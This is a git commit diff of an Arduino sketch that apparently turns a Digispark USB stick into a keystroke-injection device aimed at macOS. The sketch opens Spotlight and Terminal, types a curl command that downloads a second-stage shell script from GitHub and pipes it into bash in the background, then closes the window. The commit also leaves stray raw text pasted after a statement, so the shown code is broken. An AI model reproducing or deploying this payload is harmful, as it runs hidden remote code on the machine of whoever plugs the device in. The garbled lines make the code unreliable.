049c1c727dc19f4f41407bb07e4ae85b13ab6526
Gianluca Venturini <gianluca.91@gmail.com>
2022-06-17 17:40:57 -0700

    Test spotlight before starting

--- papera/papera.ino
+++ papera/papera.ino
@@ -2,7 +2,11 @@
 
 void setup()
 {
-  delay(2000);
+  delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  delay(500);
+  DigiKeyboard.sendKeyStroke(41); // KEY_ESC
+  delay(500);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   delay(500);
   DigiKeyboard.print("terminal");
@@ -12,7 +16,9 @@ void setup()
   DigiKeyboard.print("curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/second-stage.sh | nohup /bin/bash");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(2000);
-  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);terminal
+  curl https://raw.githubusercontent.com/gianluca-venturini/papera/master/second-stage.sh | nohup /bin/bash
+  
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
